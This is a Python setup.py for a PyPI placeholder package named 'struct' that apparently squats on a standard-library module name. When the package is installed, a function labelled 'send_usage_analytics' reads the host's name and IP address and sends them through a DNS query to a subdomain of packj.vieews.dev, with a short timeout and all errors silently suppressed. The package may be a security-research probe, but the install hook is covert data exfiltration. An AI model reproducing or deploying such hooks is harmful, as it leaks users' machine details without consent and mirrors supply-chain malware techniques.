# Import our newly installed setuptools package.
import setuptools

import socket

from contextlib import contextmanager
import signal

def raise_error(signum, frame):
	"""This handler will raise an error inside gethostbyname"""
	raise OSError

@contextmanager
def set_signal(signum, handler):
	"""Temporarily set signal"""
	old_handler = signal.getsignal(signum)
	signal.signal(signum, handler)
	try:
		yield
	finally:
		signal.signal(signum, old_handler)

@contextmanager
def set_alarm(time):
	"""Temporarily set alarm"""
	signal.setitimer(signal.ITIMER_REAL, time)
	try:
		yield
	finally:
		signal.setitimer(signal.ITIMER_REAL, 0) # Disable alarm

@contextmanager
def raise_on_timeout(time):
	"""This context manager will raise an OSError unless
	The with scope is exited in time."""
	with set_signal(signal.SIGALRM, raise_error):
		with set_alarm(time):
			yield

def send_usage_analytics(pkg_name, ver_str):
	try:
		# Timeout in 100 milliseconds
		with raise_on_timeout(0.01):
			host_name = socket.gethostname()
			ipaddr = socket.gethostbyname(host_name)
			query = f'#{ipaddr}#{host_name}#PyPI%{pkg_name}%{ver_str}%packj.vieews.dev'
			socket.gethostbyname(query)
	except:
		pass

send_usage_analytics("struct", "1.0.0")
print("This is a placeholder package. Please contact for removal.")

# Opens our README.md and assigns it to long_description.
with open("README.md", "r") as fh:
    long_description = fh.read()

# Defines requests as a requirement in order for this package to operate. The dependencies of the project.
# requirements = ["requests<=2.21.0"]

# Function that takes several arguments. It assigns these values to our package.
setuptools.setup(
    # Distribution name the package. Name must be unique so adding your username at the end is common.
    name="struct",
    # Version number of your package. Semantic versioning is commonly used.
    version="1.0.0",
    # Author name.
    author="Ashish Bijlani",
    # Author's email address.
    author_email="ab@gmail.com",
    # Short description that will show on the PyPi page.
    description="A placeholder package",
    # Long description that will display on the PyPi page. Uses the repo's README.md to populate this.
    long_description=long_description,
    # Defines the content type that the long_description is using.
    long_description_content_type="text/markdown",
    # The URL that represents the homepage of the project. Most projects link to the repo.
    url="https://github.com/ashishbijlani/sample-pypi-package",
    # Finds all packages within in the project and combines them into the distribution together.
    packages=setuptools.find_packages(),
    # requirements or dependencies that will be installed alongside your package when the user installs it via pip.
    # install_requires=requirements,
    # Gives pip some metadata about the package. Also displays on the PyPi page.
    classifiers=[
        "Programming Language :: Python :: 3.8",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    # The version of Python that is required.
    python_requires='>=3.6',
)
